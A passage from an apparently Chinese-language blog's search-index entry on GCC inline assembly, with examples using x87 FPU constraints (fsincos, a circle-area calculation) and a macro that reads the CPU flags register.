class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">float</span> angle = <span class="number">90</span>;  </span><br><span class="line"><span class="keyword">float</span> radian, cosine, sine;</span><br><span class="line"></span><br><span class="line">radian = angle / <span class="number">180</span> * <span class="number">3.14159</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">asm</span> ( <span class="string">"fsincos"</span></span><br><span class="line">        : <span class="string">"=t"</span> (cosine), <span class="string">"=u"</span> ( sine )  <span class="comment">//指定输出值所在的FPU</span></span><br><span class="line">        : <span class="string">"0"</span> ( radian ) );</span><br><span class="line"><span class="built_in">printf</span>( <span class="string">"The cosine is %f, and the sine is %f\n"</span>, cosine, sine );</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  这里我们对浮点数进行处理，浮点数有如下约束</p><ul><li>t引用顶部的浮点寄存器</li><li>f引用任何可用的浮点寄存器</li><li>u引用第二个浮点寄存器</li><li><strong>从FPU获得输出值的时候，不能使用约束f，必须声明约束t或者u来指定输出值所在的FPU</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">asm</span> ( <span class="string">"fsincos"</span></span><br><span class="line">      : <span class="string">"=t"</span> (cosine), <span class="string">"=u"</span> ( sine )</span><br><span class="line">      : <span class="string">"0"</span> ( radian ) );</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">asm</span> ( <span class="string">"fild %1\n\t"</span></span><br><span class="line">      <span class="string">"fimul %1\n\t"</span></span><br><span class="line">      <span class="string">"fldpi\n\t"</span></span><br><span class="line">      <span class="string">"fmul %%st(1), %%st(0)"</span></span><br><span class="line">      : <span class="string">"=t"</span> ( area )</span><br><span class="line">      : <span class="string">"m"</span> ( radius )  </span><br><span class="line">      : <span class="string">"%st(1)"</span> );           <span class="comment">//因为使用了ST(1)寄存器，但是没有把它赋值为输出值，所以必须在改动的寄存器列表中列出它，以便编译器直到在处理完成之后情况它.</span></span><br><span class="line"><span class="built_in">printf</span>( <span class="string">"The result is %f\n"</span>, area );</span><br></pre></td></tr></table></figure><p>最后就是我为了偷懒写的程序，写成了一个内联汇编宏函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GETPSW(a,b,flags)(&#123;\</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"add %[b], %[a]\n\t"</span> \</span><br><span class="line">        <span class="string">"pushfq\n\t"</span>         \</span><br><span class="line">        <span class="string">"pop %[f1]"</span>          \</span><br><span class="line">        : [f1] <span class="string">"=m"</span>(flags)   \</span><br><span class="line">        : [b] <span class="string">"r"</span>(b), [a]<span class="string">"r"</span>(a) \</span><br><span class="line">        );&#125;)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Assembler</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
